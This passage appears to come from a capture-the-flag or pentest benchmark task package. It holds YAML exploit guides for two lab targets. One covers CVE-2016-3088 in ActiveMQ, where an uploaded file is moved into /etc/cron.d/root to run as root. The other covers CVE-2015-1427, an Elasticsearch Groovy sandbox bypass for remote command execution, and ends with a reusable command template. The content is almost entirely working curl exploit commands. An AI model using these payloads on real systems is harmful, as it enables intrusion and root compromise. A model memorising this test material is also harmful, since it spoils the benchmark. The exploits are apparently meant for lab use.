- IP: 192.168.100.2

- Flag location: file:/flag
- Flag read hint: curl -s http://{{target_ip}}:8161/fileserver/flag.txt

#### Exploit Guide for CVE-2016-3088:
version: 2
cve_id: CVE-2016-3088
summary: Exploits unauthenticated ActiveMQ fileserver to write a cron job that copies
  the flag to a web-accessible directory.
target:
  protocol: http
  port: 8161
  service_role: web_application
  endpoints:
  - /fileserver/
preconditions:
  attack_vector: network
  privileges_required: none
  required_service:
    protocol: http
    port: 8161
steps:
- id: step-1
  action: Write cron job payload to fileserver
  procedure: PUT a cron job file that copies /flag to the web-accessible fileserver
    directory.
  command_hint: 'curl -s -X PUT -d ''* * * * * root cp /flag /opt/activemq/webapps/fileserver/flag.txt\n''
    http://{{target_ip}}:{{target_port}}/fileserver/cron.txt -w ''\nHTTP_CODE: %{http_code}\n'''
  depends_on: []
  success_signal: HTTP 204 response
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
- id: step-2
  action: Move cron payload to /etc/cron.d/root
  procedure: Use HTTP MOVE method to move the uploaded file to /etc/cron.d/root to
    trigger execution as root.
  command_hint: 'curl -s -X MOVE -H ''Destination: file:///etc/cron.d/root'' http://{{target_ip}}:{{target_port}}/fileserver/cron.txt
    -w ''\nHTTP_CODE: %{http_code}\n'''
  depends_on:
  - step-1
  success_signal: HTTP 204 response
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
- id: step-3
  action: Wait for cron execution and retrieve flag
  procedure: Wait for the cron job to execute (up to 70 seconds) and retrieve the
    flag from the fileserver endpoint.
  command_hint: sleep 70 && curl -s http://{{target_ip}}:{{target_port}}/fileserver/flag.txt
  depends_on:
  - step-2
  success_signal: Flag content retrieved with HTTP 200
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
post_exploit:
  principal: root
  capabilities:
  - execute_command
  - read_file
  - write_file
  - network_vantage
  command_channel:
    type: cron
    established_by:
    - step-2
    invocation_hint: Write a new cron job via PUT and MOVE to /etc/cron.d/ to execute
      commands as root
    reusable: false
requirements:
  tools:
  - curl
  materials: []
  authentication: none
  callback: none
evidence_refs:
- verification.native_verification.evidence

### Target 2: target-2 (CVE: CVE-2015-1427)
- IP: 10.10.2.2
- Ports: [9200, 9300]

- Flag location: file:/flag
- Flag read hint: curl -s -X POST 'http://{{target_ip}}:{{target_port}}/_search?pretty' -H 'Content-Type: application/text' -d '{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /flag\").getText()"}}}'

#### Exploit Guide for CVE-2015-1427:
version: 2
cve_id: CVE-2015-1427
summary: Exploits an ElasticSearch Groovy sandbox bypass to execute arbitrary commands
  and read the flag file via the _search API.
target:
  protocol: http
  port: 9200
  service_role: web_application
  endpoints: []
preconditions:
  attack_vector: network
  privileges_required: none
  required_service:
    protocol: http
    port: 9200
steps:
- id: step-1
  action: Create dummy document
  procedure: Create a dummy document in ElasticSearch to ensure the _search API returns
    at least one hit for the script_fields payload.
  command_hint: 'curl -s -X POST ''http://{{target_ip}}:{{target_port}}/website/blog/''
    -H ''Content-Type: application/json'' -d ''{"name": "test"}'''
  depends_on: []
  success_signal: JSON response containing "created":true
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
- id: step-2
  action: Execute RCE to read flag
  procedure: Send a POST request to the _search API with a Groovy script that bypasses
    the sandbox and executes 'cat /flag' to read the flag.
  command_hint: 'curl -s -X POST ''http://{{target_ip}}:{{target_port}}/_search?pretty''
    -H ''Content-Type: application/text'' -d ''{"size":1, "script_fields": {"lupin":{"lang":"groovy","script":
    "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /flag\").getText()"}}}'''
  depends_on:
  - step-1
  success_signal: JSON response containing the flag value in the fields output
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
post_exploit:
  principal: root
  capabilities:
  - execute_command
  - read_file
  command_channel:
    type: http_api_rce
    established_by:
    - step-2
    invocation_hint: 'curl -s -X POST ''http://{{target_ip}}:{{target_port}}/_search?pretty''
      -H ''Content-Type: application/text'' -d ''{"size":1, "script_fields": {"lupin":{"lang":"groovy","script":
      "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"<CMD>\").getText()"}}}'''
    reusable: true
requirements:
  tools:
  - curl
  materials: []
  authentication: none
  callback: none
evidence_refs:
- verification.native_verification.evidence
